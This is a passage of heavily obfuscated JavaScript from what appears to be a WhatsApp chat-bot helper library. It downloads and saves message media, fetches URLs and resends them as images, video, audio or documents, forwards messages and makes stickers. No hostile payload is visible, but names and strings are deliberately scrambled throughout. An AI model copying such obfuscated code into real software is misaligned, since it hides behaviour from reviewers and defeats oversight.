hexanodecode_使化ذなら部ق=hexanodecode_可ف们理ヒ['\x6d\x73\x67']?hexanodecode_可ف们理ヒ[hexanodecode_ا用方や(0x28a)]:hexanodecode_可ف们理ヒ,hexanodecode_为る我ツ方シヒ在=(hexanodecode_可ف们理ヒ[hexanodecode_ا用方や(0x28a)]||hexanodecode_可ف们理ヒ)[hexanodecode_ا用方や(0x145)+hexanodecode_ا用方や(0x131)]||'',hexanodecode_以تم力用所因てい=hexanodecode_可ف们理ヒ['\x6d\x74\x79\x70\x65']?hexanodecode_可ف们理ヒ[hexanodecode_ا用方や(0x109)]['\x72\x65\x70\x6c\x61'+'\x63\x65'](/Message/gi,''):hexanodecode_为る我ツ方シヒ在[hexanodecode_ا用方や(0x120)]('\x2f')[0x1e33+-0x75e*-0x1+-0x2591];const hexanodecode_اる学方طネちذ=await downloadContentFromMessage(hexanodecode_使化ذなら部ق,hexanodecode_以تم力用所因てい);let hexanodecode_ノタセتみ了=Buffer['\x66\x72\x6f\x6d']([]);for await(const hexanodecode_な由然へ它ヲの出 of hexanodecode_اる学方طネちذ){hexanodecode_ノタセتみ了=Buffer[hexanodecode_ا用方や(0x22a)+'\x74']([hexanodecode_ノタセتみ了,hexanodecode_な由然へ它ヲの出]);}let hexanodecode_从开ハتカなさ=await FileType[hexanodecode_ا用方や(0x3cf)+'\x75\x66\x66\x65\x72'](hexanodecode_ノタセتみ了);return trueFileName=hexanodecode_由キれモ使天も过?hexanodecode_トか来ヘ家モ物从进+'\x2e'+hexanodecode_从开ハتカなさ[hexanodecode_ا用方や(0x1de)]:hexanodecode_トか来ヘ家モ物从进,await fs[hexanodecode_ا用方や(0x182)+'\x46\x69\x6c\x65\x53'+hexanodecode_ا用方や(0x32c)](trueFileName,hexanodecode_ノタセتみ了),trueFileName;},hexanodecode_于度ن有[hexanodecode_地会这フ过两(0x394)+hexanodecode_地会这フ过两(0x245)+hexanodecode_地会这フ过两(0x18b)+'\x73\x73\x61\x67\x65']=async hexanodecode_前ح里صしヘ都我=>{const hexanodecode_ロか加然れテエد=hexanodecode_地会这フ过两;let hexanodecode_な种せ工らق=(hexanodecode_前ح里صしヘ都我[hexanodecode_ロか加然れテエد(0x28a)]||hexanodecode_前ح里صしヘ都我)['\x6d\x69\x6d\x65\x74'+hexanodecode_ロか加然れテエد(0x131)]||'',hexanodecode_在国ن点面=hexanodecode_前ح里صしヘ都我[hexanodecode_ロか加然れテエد(0x109)]?hexanodecode_前ح里صしヘ都我['\x6d\x74\x79\x70\x65'][hexanodecode_ロか加然れテエد(0x30e)+'\x63\x65'](/Message/gi,''):hexanodecode_な种せ工らق[hexanodecode_ロか加然れテエد(0x120)]('\x2f')[0xb51*0x2+0x1c5b+0x32fd*-0x1];const hexanodecode_ط量起رち应や=await downloadContentFromMessage(hexanodecode_前ح里صしヘ都我,hexanodecode_在国ن点面);let hexanodecode_以量从行的点由多ا=Buffer[hexanodecode_ロか加然れテエد(0x167)]([]);for await(const hexanodecode_ض现物生جニ发 of hexanodecode_ط量起رち应や){hexanodecode_以量从行的点由多ا=Buffer[hexanodecode_ロか加然れテエد(0x22a)+'\x74']([hexanodecode_以量从行的点由多ا,hexanodecode_ض现物生جニ发]);}return hexanodecode_以量从行的点由多ا;},hexanodecode_于度ن有[hexanodecode_地会这フ过两(0x235)+hexanodecode_地会这フ过两(0x140)+'\x6c']=async(hexanodecode_自起还خ一,hexanodecode_应个スか,hexanodecode_メぬタ应,hexanodecode_国りتヒ,hexanodecode_着学中应={})=>{const hexanodecode_صم对和水用会=hexanodecode_地会这フ过两;let hexanodecode_能于クの用م部='',hexanodecode_れ过他ヌ本ノ=await axios[hexanodecode_صم对和水用会(0x3b1)](hexanodecode_应个スか);hexanodecode_能于クの用م部=hexanodecode_れ过他ヌ本ノ['\x68\x65\x61\x64\x65'+'\x72\x73'][hexanodecode_صم对和水用会(0x137)+hexanodecode_صم对和水用会(0x2f7)+'\x70\x65'];if(hexanodecode_能于クの用م部['\x73\x70\x6c\x69\x74']('\x2f')[0x131b+-0x1373*-0x2+-0x3a00]===hexanodecode_صم对和水用会(0xe2))return hexanodecode_于度ن有[hexanodecode_صم对和水用会(0x357)+hexanodecode_صم对和水用会(0x33e)+'\x65'](hexanodecode_自起还خ一,{'\x76\x69\x64\x65\x6f':await getBuffer(hexanodecode_应个スか),'\x63\x61\x70\x74\x69\x6f\x6e':hexanodecode_メぬタ应,'\x67\x69\x66\x50\x6c\x61\x79\x62\x61\x63\x6b':!![],...hexanodecode_着学中应},{'\x71\x75\x6f\x74\x65\x64':hexanodecode_国りتヒ,...hexanodecode_着学中应});let hexanodecode_お过同产然同分ワて=hexanodecode_能于クの用م部[hexanodecode_صم对和水用会(0x120)]('\x2f')[0x229b+0x1*0xa3b+0x2*-0x166b]+('\x4d\x65\x73\x73\x61'+'\x67\x65');if(hexanodecode_能于クの用م部===hexanodecode_صم对和水用会(0x37d)+'\x63\x61\x74\x69\x6f'+'\x6e\x2f\x70\x64\x66')return hexanodecode_于度ن有['\x73\x65\x6e\x64\x4d'+hexanodecode_صم对和水用会(0x33e)+'\x65'](hexanodecode_自起还خ一,{'\x64\x6f\x63\x75\x6d\x65\x6e\x74':await getBuffer(hexanodecode_应个スか),'\x6d\x69\x6d\x65\x74\x79\x70\x65':hexanodecode_صم对和水用会(0x37d)+'\x63\x61\x74\x69\x6f'+hexanodecode_صم对和水用会(0x32b),'\x63\x61\x70\x74\x69\x6f\x6e':hexanodecode_メぬタ应,...hexanodecode_着学中应},{'\x71\x75\x6f\x74\x65\x64':hexanodecode_国りتヒ,...hexanodecode_着学中应});if(hexanodecode_能于クの用م部['\x73\x70\x6c\x69\x74']('\x2f')[-0x77b*0x1+-0xe3c+0x15b7]===hexanodecode_صم对和水用会(0x267))return hexanodecode_于度ن有['\x73\x65\x6e\x64\x4d'+'\x65\x73\x73\x61\x67'+'\x65'](hexanodecode_自起还خ一,{'\x69\x6d\x61\x67\x65':await getBuffer(hexanodecode_应个スか),'\x63\x61\x70\x74\x69\x6f\x6e':hexanodecode_メぬタ应,...hexanodecode_着学中应},{'\x71\x75\x6f\x74\x65\x64':hexanodecode_国りتヒ,...hexanodecode_着学中应});if(hexanodecode_能于クの用م部[hexanodecode_صم对和水用会(0x120)]('\x2f')[-0xb0*0x4+-0x3*-0xae5+-0x1def]===hexanodecode_صم对和水用会(0x11f))return hexanodecode_于度ن有[hexanodecode_صم对和水用会(0x357)+hexanodecode_صم对和水用会(0x33e)+'\x65'](hexanodecode_自起还خ一,{'\x76\x69\x64\x65\x6f':await getBuffer(hexanodecode_应个スか),'\x63\x61\x70\x74\x69\x6f\x6e':hexanodecode_メぬタ应,'\x6d\x69\x6d\x65\x74\x79\x70\x65':'\x76\x69\x64\x65\x6f'+hexanodecode_صم对和水用会(0x191),...hexanodecode_着学中应},{'\x71\x75\x6f\x74\x65\x64':hexanodecode_国りتヒ,...hexanodecode_着学中应});if(hexanodecode_能于クの用م部['\x73\x70\x6c\x69\x74']('\x2f')[-0x8*0x114+-0x53b*0x1+-0x1*-0xddb]===hexanodecode_صم对和水用会(0x393))return hexanodecode_于度ن有[hexanodecode_صم对和水用会(0x357)+hexanodecode_صم对和水用会(0x33e)+'\x65'](hexanodecode_自起还خ一,{'\x61\x75\x64\x69\x6f':await getBuffer(hexanodecode_应个スか),'\x63\x61\x70\x74\x69\x6f\x6e':hexanodecode_メぬタ应,'\x6d\x69\x6d\x65\x74\x79\x70\x65':hexanodecode_صم对和水用会(0x393)+'\x2f\x6d\x70\x65\x67',...hexanodecode_着学中应},{'\x71\x75\x6f\x74\x65\x64':hexanodecode_国りتヒ,...hexanodecode_着学中应});},hexanodecode_于度ن有[hexanodecode_地会这フ过两(0x169)]=(hexanodecode_家زり于还三个ひ,hexanodecode_我メヨ而,hexanodecode_工ظしر法开ث三='',hexanodecode_し把从得を天ら自=hexanodecode_于度ن有[hexanodecode_地会这フ过两(0x349)]['\x69\x64'],hexanodecode_ろあ等子一エ={})=>{const hexanodecode_二行め所外行ヒ体ث=hexanodecode_地会这フ过两;let hexanodecode_度フخ力人=Object[hexanodecode_二行め所外行ヒ体ث(0x29b)](hexanodecode_我メヨ而[hexanodecode_二行め所外行ヒ体ث(0x194)+'\x67\x65'])[0x1b77+0x1c*-0xde+-0x32f],hexanodecode_行ルしをم开主出ヨ=hexanodecode_度フخ力人===hexanodecode_二行め所外行ヒ体ث(0x3c6)+hexanodecode_二行め所外行ヒ体ث(0x34c)+'\x65\x73\x73\x61\x67'+'\x65';hexanodecode_行ルしをم开主出ヨ&&(hexanodecode_度フخ力人=Object['\x6b\x65\x79\x73'](hexanodecode_我メヨ而[hexanodecode_二行め所外行ヒ体ث(0x194)+'\x67\x65'][hexanodecode_二行め所外行ヒ体ث(0x3c6)+'\x65\x72\x61\x6c\x4d'+hexanodecode_二行め所外行ヒ体ث(0x33e)+'\x65'][hexanodecode_二行め所外行ヒ体ث(0x194)+'\x67\x65'])[0x1381+-0x9e5+-0x99c]);let hexanodecode_前去ニو国动它テ=hexanodecode_行ルしをم开主出ヨ?hexanodecode_我メヨ而[hexanodecode_二行め所外行ヒ体ث(0x194)+'\x67\x65'][hexanodecode_二行め所外行ヒ体ث(0x3c6)+hexanodecode_二行め所外行ヒ体ث(0x34c)+hexanodecode_二行め所外行ヒ体ث(0x33e)+'\x65']['\x6d\x65\x73\x73\x61'+'\x67\x65']:hexanodecode_我メヨ而[hexanodecode_二行め所外行ヒ体ث(0x194)+'\x67\x65'],hexanodecode_セれ产غ点动国=hexanodecode_前去ニو国动它テ[hexanodecode_度フخ力人];if(typeof hexanodecode_セれ产غ点动国===hexanodecode_二行め所外行ヒ体ث(0x1a3)+'\x67')hexanodecode_前去ニو国动它テ[hexanodecode_度フخ力人]=hexanodecode_工ظしر法开ث三||hexanodecode_セれ产غ点动国;else{if(hexanodecode_セれ产غ点动国['\x63\x61\x70\x74\x69'+'\x6f\x6e'])hexanodecode_セれ产غ点动国[hexanodecode_二行め所外行ヒ体ث(0x298)+'\x6f\x6e']=hexanodecode_工ظしر法开ث三||hexanodecode_セれ产غ点动国[hexanodecode_二行め所外行ヒ体ث(0x298)+'\x6f\x6e'];else{if(hexanodecode_セれ产غ点动国[hexanodecode_二行め所外行ヒ体ث(0x155)])hexanodecode_セれ产غ点动国['\x74\x65\x78\x74']=hexanodecode_工ظしر法开ث三||hexanodecode_セれ产غ点动国['\x74\x65\x78\x74'];}}if(typeof hexanodecode_セれ产غ点动国!==hexanodecode_二行め所外行ヒ体ث(0x1a3)+'\x67')hexanodecode_前去ニو国动它テ[hexanodecode_度フخ力人]={...hexanodecode_セれ产غ点动国,...hexanodecode_ろあ等子一エ};if(hexanodecode_我メヨ而['\x6b\x65\x79'][hexanodecode_二行め所外行ヒ体ث(0x1db)+'\x63\x69\x70\x61\x6e'+'\x74'])hexanodecode_し把从得を天ら自=hexanodecode_我メヨ而['\x6b\x65\x79']['\x70\x61\x72\x74\x69'+hexanodecode_二行め所外行ヒ体ث(0x362)+'\x74']=hexanodecode_し把从得を天ら自||hexanodecode_我メヨ而['\x6b\x65\x79']['\x70\x61\x72\x74\x69'+hexanodecode_二行め所外行ヒ体ث(0x362)+'\x74'];else{if(hexanodecode_我メヨ而[hexanodecode_二行め所外行ヒ体ث(0x278)]['\x70\x61\x72\x74\x69'+hexanodecode_二行め所外行ヒ体ث(0x362)+'\x74'])hexanodecode_し把从得を天ら自=hexanodecode_我メヨ而[hexanodecode_二行め所外行ヒ体ث(0x278)][hexanodecode_二行め所外行ヒ体ث(0x1db)+hexanodecode_二行め所外行ヒ体ث(0x362)+'\x74']=hexanodecode_し把从得を天ら自||hexanodecode_我メヨ而[hexanodecode_二行め所外行ヒ体ث(0x278)][hexanodecode_二行め所外行ヒ体ث(0x1db)+hexanodecode_二行め所外行ヒ体ث(0x362)+'\x74'];}if(hexanodecode_我メヨ而['\x6b\x65\x79'][hexanodecode_二行め所外行ヒ体ث(0x238)+hexanodecode_二行め所外行ヒ体ث(0x2e7)]['\x69\x6e\x63\x6c\x75'+hexanodecode_二行め所外行ヒ体ث(0x2ba)](hexanodecode_二行め所外行ヒ体ث(0x34a)+hexanodecode_二行め所外行ヒ体ث(0x24f)+hexanodecode_二行め所外行ヒ体ث(0x3e3)))hexanodecode_し把从得を天ら自=hexanodecode_し把从得を天ら自||hexanodecode_我メヨ而[hexanodecode_二行め所外行ヒ体ث(0x278)][hexanodecode_二行め所外行ヒ体ث(0x238)+'\x65\x4a\x69\x64'];else{if(hexanodecode_我メヨ而[hexanodecode_二行め所外行ヒ体ث(0x278)]['\x72\x65\x6d\x6f\x74'+hexanodecode_二行め所外行ヒ体ث(0x2e7)][hexanodecode_二行め所外行ヒ体ث(0x33c)+hexanodecode_二行め所外行ヒ体ث(0x2ba)](hexanodecode_二行め所外行ヒ体ث(0x3a7)+hexanodecode_二行め所外行ヒ体ث(0x117)))hexanodecode_し把从得を天ら自=hexanodecode_し把从得を天ら自||hexanodecode_我メヨ而[hexanodecode_二行め所外行ヒ体ث(0x278)][hexanodecode_二行め所外行ヒ体ث(0x238)+hexanodecode_二行め所外行ヒ体ث(0x2e7)];}return hexanodecode_我メヨ而[hexanodecode_二行め所外行ヒ体ث(0x278)][hexanodecode_二行め所外行ヒ体ث(0x238)+hexanodecode_二行め所外行ヒ体ث(0x2e7)]=hexanodecode_家زり于还三个ひ,hexanodecode_我メヨ而[hexanodecode_二行め所外行ヒ体ث(0x278)]['\x66\x72\x6f\x6d\x4d'+'\x65']=hexanodecode_し把从得を天ら自===hexanodecode_于度ن有['\x75\x73\x65\x72']['\x69\x64'],proto[hexanodecode_二行め所外行ヒ体ث(0x15b)+hexanodecode_二行め所外行ヒ体ث(0x2d6)+'\x49\x6e\x66\x6f'][hexanodecode_二行め所外行ヒ体ث(0x173)+hexanodecode_二行め所外行ヒ体ث(0x1f1)](hexanodecode_我メヨ而);},hexanodecode_于度ن有[hexanodecode_地会这フ过两(0x281)+'\x6c\x65']=async(hexanodecode_如天イ本和よ,hexanodecode_ねぬ个カ之对ك)=>{const hexanodecode_加和オ对フا和るル=hexanodecode_地会这フ过两;let hexanodecode_得的电而,hexanodecode_ヌカ开ら=Buffer[hexanodecode_加和オ对フا和るル(0x174)+hexanodecode_加和オ对フا和るル(0x3e5)](hexanodecode_如天イ本和よ)?hexanodecode_如天イ本和よ:/^data:.*?\/.*?;base64,/i['\x74\x65\x73\x74'](hexanodecode_如天イ本和よ)?Buffer[hexanodecode_加和オ对フا和るル(0x167)](hexanodecode_如天イ本和よ[hexanodecode_加和オ对フا和るル(0x120)]`,`[0x1*0xc83+-0x1*-0x1c8f+-0x2911],hexanodecode_加和オ对フا和るル(0x30c)+'\x34'):/^https?:\/\//[hexanodecode_加和オ对フا和るル(0x2c7)](hexanodecode_如天イ本和よ)?await(hexanodecode_得的电而=await getBuffer(hexanodecode_如天イ本和よ)):fs[hexanodecode_加和オ对フا和るル(0x1ff)+hexanodecode_加和オ对フا和るル(0x121)](hexanodecode_如天イ本和よ)?(hexanodecode_上分おيヨ家=hexanodecode_如天イ本和よ,fs['\x72\x65\x61\x64\x46'+hexanodecode_加和オ对フا和るル(0x344)+'\x6e\x63'](hexanodecode_如天イ本和よ)):typeof hexanodecode_如天イ本和よ==='\x73\x74\x72\x69\x6e'+'\x67'?hexanodecode_如天イ本和よ:Buffer['\x61\x6c\x6c\x6f\x63'](-0x1a86+-0xef0+0x2976);const hexanodecode_عヤ使如面以は={};hexanodecode_عヤ使如面以は[hexanodecode_加和オ对フا和るル(0x220)]='\x61\x70\x70\x6c\x69'+hexanodecode_加和オ对フا和るル(0x219)+hexanodecode_加和オ对フا和るル(0x3b6)+hexanodecode_加和オ对フا和るル(0x1c4)+hexanodecode_加和オ对フا和るル(0x2cc),hexanodecode_عヤ使如面以は[hexanodecode_加和オ对フا和るル(0x1de)]='\x2e\x62\x69\x6e';let hexanodecode_地ワウ国=await FileType[hexanodecode_加和オ对フا和るル(0x3cf)+'\x75\x66\x66\x65\x72'](hexanodecode_ヌカ开ら)||hexanodecode_عヤ使如面以は,hexanodecode_上分おيヨ家=path[hexanodecode_加和オ对フا和るル(0x136)](__filename,__dirname+new Date()*(-0x1*0x2315+0xf4a+0x13cc)+'\x2e'+hexanodecode_地ワウ国[hexanodecode_加和オ对フا和るル(0x1de)]);if(hexanodecode_ヌカ开ら&&hexanodecode_ねぬ个カ之对ك)fs[hexanodecode_加和オ对フا和るル(0x323)+hexanodecode_加和オ对フا和るル(0x1b8)]['\x77\x72\x69\x74\x65'+'\x46\x69\x6c\x65'](hexanodecode_上分おيヨ家,hexanodecode_ヌカ开ら);return{'\x72\x65\x73':hexanodecode_得的电而,'\x66\x69\x6c\x65\x6e\x61\x6d\x65':hexanodecode_上分おيヨ家,'\x73\x69\x7a\x65':await getSizeMedia(hexanodecode_ヌカ开ら),...hexanodecode_地ワウ国,'\x64\x61\x74\x61':hexanodecode_ヌカ开ら};},hexanodecode_于度ن有[hexanodecode_地会这フ过两(0x235)+hexanodecode_地会这フ过两(0x372)]=async(hexanodecode_カアほミ作おシ主,hexanodecode_にやきよるシ子所也,hexanodecode_بれ因从ら等之ヒش,hexanodecode_里政量コトト之={},hexanodecode_ظظル得力法え={})=>{const hexanodecode_ナظ在د的之化=hexanodecode_地会这フ过两;let hexanodecode_コ个本يف=await hexanodecode_于度ن有[hexanodecode_ナظ在د的之化(0x281)+'\x6c\x65'](hexanodecode_にやきよるシ子所也,!![]),{filename:hexanodecode_用ا成う机,size:hexanodecode_民さノた当三现わ,ext:hexanodecode_ケい这はس,mime:hexanodecode_不自رう下マアエ,data:hexanodecode_部出要ケ}=hexanodecode_コ个本يف,hexanodecode_一应后シて='',hexanodecode_ソいه和应و=hexanodecode_不自رう下マアエ,hexanodecode_之时上当る都こト=hexanodecode_用ا成う机;if(hexanodecode_ظظル得力法え[hexanodecode_ナظ在د的之化(0x3ea)+hexanodecode_ナظ在د的之化(0x353)])hexanodecode_一应后シて='\x64\x6f\x63\x75\x6d'+hexanodecode_ナظ在د的之化(0x334);if(hexanodecode_ظظル得力法え[hexanodecode_ナظ在د的之化(0x3ef)+hexanodecode_ナظ在د的之化(0x3e0)]||/webp/[hexanodecode_ナظ在د的之化(0x2c7)](hexanodecode_不自رう下マアエ)){let {writeExif:hexanodecode_كييナミ民ミ}=require(hexanodecode_ナظ在د的之化(0x30f)+hexanodecode_ナظ在د的之化(0x2ad));const hexanodecode_ا之物出み力政={};hexanodecode_ا之物出み力政[hexanodecode_ナظ在د的之化(0x145)+hexanodecode_ナظ在د的之化(0x131)]=hexanodecode_不自رう下マアエ,hexanodecode_ا之物出み力政['\x64\x61\x74\x61']=hexanodecode_部出要ケ;let hexanodecode_ロج所要于れ上い之=hexanodecode_ا之物出み力政;const hexanodecode_国力三ロ人={};hexanodecode_国力三ロ人[hexanodecode_ナظ在د的之化(0x276)+hexanodecode_ナظ在د的之化(0x34e)]=Config[hexanodecode_ナظ在د的之化(0x276)+hexanodecode_ナظ在د的之化(0x34e)],hexanodecode_国力三ロ人[hexanodecode_ナظ在د的之化(0x311)+'\x72']=Config[hexanodecode_ナظ在د的之化(0x276)+'\x61\x6d\x65'],hexanodecode_国力三ロ人[hexanodecode_ナظ在د的之化(0x320)+'\x6f\x72\x69\x65\x73']=hexanodecode_ظظル得力法え[hexanodecode_ナظ在د的之化(0x320)+hexanodecode_ナظ在د的之化(0x193)]?hexanodecode_ظظル得力法え[hexanodecode_ナظ在د的之化(0x320)+hexanodecode_ナظ在د的之化(0x193)]:[],hexanodecode_之时上当る都こト=await hexanodecode_كييナミ民ミ(hexanodecode_ロج所要于れ上い之,hexanodecode_国力三ロ人),await fs['\x70\x72\x6f\x6d\x69'+hexanodecode_ナظ在د的之化(0x1b8)][hexanodecode_ナظ在د的之化(0x3cc)+'\x6b'](hexanodecode_用ا成う机),hexanodecode_一应后シて=hexanodecode_ナظ在د的之化(0xe0)+'\x65\x72',hexanodecode_ソいه和应و=hexanodecode_ナظ在د的之化(0x267)+'\x2f\x77\x65\x62\x70';}else{if(/image/[hexanodecode_ナظ在د的之化(0x2c7)](hexanodecode_不自رう下マアエ))hexanodecode_一应后シて='\x69\x6d\x61\x67\x65';else{if(/video/[hexanodecode_ナظ在د的之化(0x2c7)](hexanodecode_不自رう下マアエ))hexanodecode_一应后シて=hexanodecode_ナظ在د的之化(0x11f);else{if(/audio/[hexanodecode_ナظ在د的之化(0x2c7)](hexanodecode_不自رう下マアエ))hexanodecode_一应后シて='\x61\x75\x64\x69\x6f';else hexanodecode_一应后シて='\x64\x6f\x63\x75\x6d'+hexanodecode_ナظ在د的之化(0x334);}}}const hexanodecode_テ开ه好ん当テ={};hexanodecode_テ开ه好ん当テ['\x75\x72\x6c']=hexanodecode_之时上当る都こト;const hexanodecode_本制ゆ下テセ我て={[hexanodecode_一应后シて]:hexanodecode_テ开ه好ん当テ,'\x6d\x69\x6d\x65\x74\x79\x70\x65':hexanodecode_ソいه和应و,'\x66\x69\x6c\x65\x4e\x61\x6d\x65':hexanodecode_بれ因从ら等之ヒش,...hexanodecode_ظظル得力法え},hexanodecode_イ面さ上={'\x71\x75\x6f\x74\x65\x64':hexanodecode_里政量コトト之,...hexanodecode_ظظル得力法え};return await hexanodecode_于度ن有['\x73\x65\x6e\x64\x4d'+'\x65\x73\x73\x61\x67'+'\x65'](hexanodecode_カアほミ作おシ主,hexanodecode_本制ゆ下テセ我て,hexanodecode_イ面さ上),fs[hexanodecode_ナظ在د的之化(0x323)+hexanodecode_ナظ在د的之化(0x1b8)][hexanodecode_ナظ在د的之化(0x3cc)+'\x6b'](hexanodecode_之时上当る都こト);},hexanodecode_于度ن有['\x70\x61\x72\x73\x65'+hexanodecode_地会这フ过两(0x1e5)+'\x6f\x6e']=async hexanodecode_チヌ一对=>{const hexanodecode_ق地بサ当=hexanodecode_地会这フ过两;return[...hexanodecode_チヌ一对[hexanodecode_ق地بサ当(0x338)+'\x41\x6c\x6c'](/@([0-9]{5,16}|0)/g)]['\x6d\x61\x70'](hexanodecode_开ل然か本然家ト=>hexanodecode_开ل然か本然家ト[0x11b6+0x12d0+-0x2485]+(hexanodecode_ق地بサ当(0x34a)+hexanodecode_ق地بサ当(0x24f)+hexanodecode_ق地بサ当(0x3e3)));},hexanodecode_于度ن有[hexanodecode_地会这フ过两(0x357)+hexanodecode_地会这フ过两(0x28c)]=async(hexanodecode_大ウけ上之フしきث,hexanodecode_こ过え业当,hexanodecode_到说ノよヤج='',hexanodecode_不ラغメ之هハイす='',hexanodecode_رツチう政まط='',hexanodecode_めフノ其作わよ水={})=>{const hexanodecode_里开种这能=hexanodecode_地会这フ过两;let hexanodecode_ミちر以نا=await hexanodecode_于度ن有[hexanodecode_里开种这能(0x281)+'\x6c\x65'](hexanodecode_こ过え业当,!![]),{mime:hexanodecode_性カ得从加子着点,ext:hexanodecode_ね些不实十なヲع,res:hexanodecode_カتヒ作量法هに方,data:hexanodecode_ق而オ十二,filename:hexanodecode_し体而るيス}=hexanodecode_ミちر以نا;if(hexanodecode_カتヒ作量法هに方&&hexanodecode_カتヒ作量法هに方[hexanodecode_里开种这能(0xef)+'\x73']!==0xf04+0x182d*0x1+-0x2669||file[hexanodecode_里开种这能(0x19a)+'\x68']<=0x12a6e+0x18633+-0x1b0a1*0x1)try{throw{'\x6a\x73\x6f\x6e':JSON[hexanodecode_里开种这能(0x242)](file[hexanodecode_里开种这能(0x291)+hexanodecode_里开种这能(0x2d1)]())};}catch(hexanodecode_タوむ子しレ种){if(hexanodecode_タوむ子しレ种[hexanodecode_里开种这能(0x1cb)])throw hexanodecode_タوむ子しレ种[hexanodecode_里开种这能(0x1cb)];}let hexanodecode_人了チخ='',hexanodecode_ス定ユ当せهユ下=hexanodecode_性カ得从加子着点,hexanodecode_ク用س多ذ之制=hexanodecode_し体而るيス;if(hexanodecode_めフノ其作わよ水[hexanodecode_里开种这能(0x3ea)+'\x75\x6d\x65\x6e\x74'])hexanodecode_人了チخ=hexanodecode_里开种这能(0x275)+'\x65\x6e\x74';if(hexanodecode_めフノ其作わよ水[hexanodecode_里开种这能(0x3ef)+hexanodecode_里开种这能(0x3e0)]||/webp/[hexanodecode_里开种这能(0x2c7)](hexanodecode_性カ得从加子着点)){let {writeExif:hexanodecode_行们ツ其它テか因年}=require(hexanodecode_里开种这能(0x30f)+'\x66');const hexanodecode_去طむネ民分ي个み={};hexanodecode_去طむネ民分ي个み[hexanodecode_里开种这能(0x145)+'\x79\x70\x65']=hexanodecode_性カ得从加子着点,hexanodecode_去طむネ民分ي个み['\x64\x61\x74\x61']=hexanodecode_ق而オ十二;let hexanodecode_家ムろ对اすテ实=hexanodecode_去طむネ民分ي个み;const hexanodecode_ل后得家ニウレ去={};hexanodecode_ل后得家ニウレ去[hexanodecode_里开种这能(0x276)+hexanodecode_里开种这能(0x34e)]=hexanodecode_めフノ其作わよ水['\x70\x61\x63\x6b\x6e'+'\x61\x6d\x65']?hexanodecode_めフノ其作わよ水['\x70\x61\x63\x6b\x6e'+hexanodecode_里开种这能(0x34e)]:Config[hexanodecode_里开种这能(0x276)+hexanodecode_里开种这能(0x34e)],hexanodecode_ل后得家ニウレ去[hexanodecode_里开种这能(0x311)+'\x72']=hexanodecode_めフノ其作わよ水[hexanodecode_里开种这能(0x311)+'\x72']?hexanodecode_めフノ其作わよ水[hexanodecode_里开种这能(0x311)+'\x72']:Config[hexanodecode_里开种这能(0x311)+'\x72'],hexanodecode_ل后得家ニウレ去[hexanodecode_里开种这能(0x320)+hexanodecode_里开种这能(0x193)]=hexanodecode_めフノ其作わよ水[hexanodecode_里开种这能(0x320)+hexanodecode_里开种这能(0x193)]?hexanodecode_めフノ其作わよ水[hexanodecode_里开种这能(0x320)+hexanodecode_里开种这能(0x193)]:[],hexanodecode_ク用س多ذ之制=await hexanodecode_行们ツ其它テか因年(hexanodecode_家ムろ对اすテ实,hexanodecode_ل后得家ニウレ去),await fs[hexanodecode_里开种这能(0x323)+hexanodecode_里开种这能(0x1b8)]['\x75\x6e\x6c\x69\x6e'+'\x6b'](hexanodecode_し体而るيス),hexanodecode_人了チخ=hexanodecode_里开种这能(0xe0)+'\x65\x72',hexanodecode_ス定ユ当せهユ下=hexanodecode_里开种这能(0x267)+'\x2f\x77\x65\x62\x70';}else{if(/image/['\x74\x65\x73\x74'](hexanodecode_性カ得从加子着点))hexanodecode_人了チخ=hexanodecode_里开种这能(0x267);else{if(/video/[hexanodecode_里开种这能(0x2c7)](hexanodecode_性カ得从加子着点))hexanodecode_人了チخ=hexanodecode_里开种这能(0x11f);else{if(/audio/[hexanodecode_里开种这能(0x2c7)](hexanodecode_性カ得从加子着点))hexanodecode_人了チخ=hexanodecode_里开种这能(0x393);else hexanodecode_人了チخ=hexanodecode_里开种这能(0x275)+hexanodecode_里开种这能(0x334);}}}const hexanodecode_シص其ヤウ水={};hexanodecode_シص其ヤウ水[hexanodecode_里开种这能(0x363)]=hexanodecode_ク用س多ذ之制;const hexanodecode_ظ上そ以={[hexanodecode_人了チخ]:hexanodecode_シص其ヤウ水,'\x63\x61\x70\x74\x69\x6f\x6e':hexanodecode_不ラغメ之هハイす,'\x6d\x69\x6d\x65\x74\x79\x70\x65':hexanodecode_ス定ユ当せهユ下,'\x66\x69\x6c\x65\x4e\x61\x6d\x65':hexanodecode_到说ノよヤج,...hexanodecode_めフノ其作わよ水},hexanodecode_们ع大些工={'\x71\x75\x6f\x74\x65\x64':hexanodecode_رツチう政まط,...hexanodecode_めフノ其作わよ水};return await hexanodecode_于度ن有[hexanodecode_里开种这能(0x357)+hexanodecode_里开种这能(0x33e)+'\x65'](hexanodecode_大ウけ上之フしきث,hexanodecode_ظ上そ以,hexanodecode_们ع大些工),fs['\x70\x72\x6f\x6d\x69'+hexanodecode_里开种这能(0x1b8)]['\x75\x6e\x6c\x69\x6e'+'\x6b'](hexanodecode_ク用س多ذ之制);},hexanodecode_于度ن有[hexanodecode_地会这フ过两(0x3c7)+hexanodecode_地会这フ过两(0x1ee)+hexanodecode_地会这フ过两(0x22d)+'\x6b\x65\x72']=async(hexanodecode_外的在于サナ家,hexanodecode_لظえぬ合成合两に,hexanodecode_す机ذ机我动ンた={})=>{const hexanodecode_あよ他主着所上=hexanodecode_地会这フ过两;let hexanodecode_ل要え前可た下下因;hexanodecode_す机ذ机我动ンた&&(hexanodecode_す机ذ机我动ンた[hexanodecode_あよ他主着所上(0x276)+hexanodecode_あよ他主着所上(0x34e)]||hexanodecode_す机ذ机我动ンた[hexanodecode_あよ他主着所上(0x311)+'\x72'])?hexanodecode_ل要え前可た下下因=await writeExifVid(hexanodecode_لظえぬ合成合两に,hexanodecode_す机ذ机我动ンた):hexanodecode_ل要え前可た下下因=await videoToWebp(hexanodecode_لظえぬ合成合两に);const hexanodecode_スキ可ج不فムりけ={};hexanodecode_スキ可ج不فムりけ[hexanodecode_あよ他主着所上(0x363)]=hexanodecode_ل要え前可た下下因;const hexanodecode_于や现里地={'\x73\x74\x69\x63\x6b\x65\x72':hexanodecode_スキ可ج不فムりけ,...hexanodecode_す机ذ机我动ンた};await hexanodecode_于度ن有[hexanodecode_あよ他主着所上(0x357)+hexanodecode_あよ他主着所上(0x33e)+'\x65'](hexanodecode_外的在于サナ家,hexanodecode_于や现里地,hexanodecode_す机ذ机我动ンた);},hexanodecode_于度ن有[hexanodecode_地会这フ过两(0x255)+'\x6d\x61\x67\x65\x41'+'\x73\x53\x74\x69\x63'+hexanodecode_地会这フ过两(0x27b)]=async(hexanodecode_中度ん主,hexanodecode_خン方这,hexanodecode_要しتヌ业ヨ={})=>{const 